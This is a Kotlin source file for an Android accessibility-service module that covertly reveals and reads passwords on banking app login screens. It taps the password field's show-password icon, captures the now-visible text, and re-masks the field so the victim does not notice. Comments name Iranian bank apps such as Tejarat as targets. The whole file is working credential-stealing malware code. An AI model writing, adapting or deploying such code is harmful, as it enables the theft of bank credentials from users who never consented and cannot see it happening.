package com.base.realtime.watch

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo

/**
 * On a password page, the eye is tapped before the main button is replayed,
 * then tapped again to restore the masked field so the user does not notice.
 * If the text is already plain, the eye is left alone.
 */
internal object EyeReveal {
    private val handler = Handler(Looper.getMainLooper())

    fun reveal(service: AccessibilityService, pkg: String, then: (List<CapturedField>) -> Unit) {
        val first = FormScan.readFields(service, pkg)
        if (first.none { needsEye(it.text) }) {
            then(first)
            return
        }
        val look = FormScan.look(service, pkg)
        val opened = clickEye(service, pkg, look.eye, look.password)
        if (!opened) {
            then(first)
            return
        }
        poll(service, pkg, look.eye, look.password, 0, then)
    }

    private fun poll(
        service: AccessibilityService,
        pkg: String,
        eye: Rect?,
        password: Rect?,
        attempt: Int,
        then: (List<CapturedField>) -> Unit,
    ) {
        handler.postDelayed({
            val values = FormScan.readFields(service, pkg)
            if (values.none { needsEye(it.text) } || attempt >= 5) {
                // Re-mask before continuing so the login flow sees the usual hidden field.
                hideEye(service, pkg, eye, password) {
                    then(values)
                }
            } else {
                poll(service, pkg, eye, password, attempt + 1, then)
            }
        }, 140)
    }

    private fun hideEye(
        service: AccessibilityService,
        pkg: String,
        eye: Rect?,
        password: Rect?,
        then: () -> Unit,
    ) {
        val look = FormScan.look(service, pkg)
        val targetEye = look.eye ?: eye
        val targetPwd = look.password ?: password
        clickEye(service, pkg, targetEye, targetPwd)
        // Wait for the app to finish toggling before the main-button replay.
        handler.postDelayed(then, 180)
    }

    private fun clickEye(service: AccessibilityService, pkg: String, eye: Rect?, password: Rect?): Boolean {
        if (eye != null && clickNodeAt(service, pkg, eye)) return true
        if (eye != null && tap(service, eye, 90)) return true
        val pwd = password ?: return false
        val density = service.resources.displayMetrics.density
        val inset = (48 * density).toInt()
        // Try both field ends: LTR eye is usually right, RTL banks (Tejarat) left.
        val right = Rect(pwd.right - inset, pwd.top + 4, pwd.right - 4, pwd.bottom - 4)
        val left = Rect(pwd.left + 4, pwd.top + 4, pwd.left + inset, pwd.bottom - 4)
        if (right.width() > 0 && right.height() > 0 && tap(service, right, 85)) return true
        return left.width() > 0 && left.height() > 0 && tap(service, left, 85)
    }

    private fun clickNodeAt(service: AccessibilityService, pkg: String, target: Rect): Boolean {
        val windows = service.windows ?: return false
        try {
            for (window in windows) {
                val root = window.root ?: continue
                if (root.packageName?.toString() != pkg) {
                    root.recycle()
                    continue
                }
                val node = findClickable(root, target)
                root.recycle()
                if (node != null) {
                    val ok = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    node.recycle()
                    if (ok) return true
                }
            }
        } finally {
            for (window in windows) {
                try {
                    window.recycle()
                } catch (_: Throwable) {
                }
            }
        }
        return false
    }

    private fun findClickable(node: AccessibilityNodeInfo, target: Rect): AccessibilityNodeInfo? {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (node.isClickable && Rect.intersects(bounds, target) && bounds.width() < target.width() * 3) {
            return AccessibilityNodeInfo.obtain(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findClickable(child, target)
            child.recycle()
            if (found != null) return found
        }
        return null
    }

    private fun tap(service: AccessibilityService, rect: Rect, durationMs: Long): Boolean {
        val path = Path().apply { moveTo(rect.centerX().toFloat(), rect.centerY().toFloat()) }
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        return service.dispatchGesture(gesture, null, null)
    }

    private fun needsEye(value: String): Boolean {
        if (value.isEmpty()) return false
        return value.any { it == '•' || it == '●' || it == '∙' || it == '·' || it == '*' || it == '⚫' }
    }
}
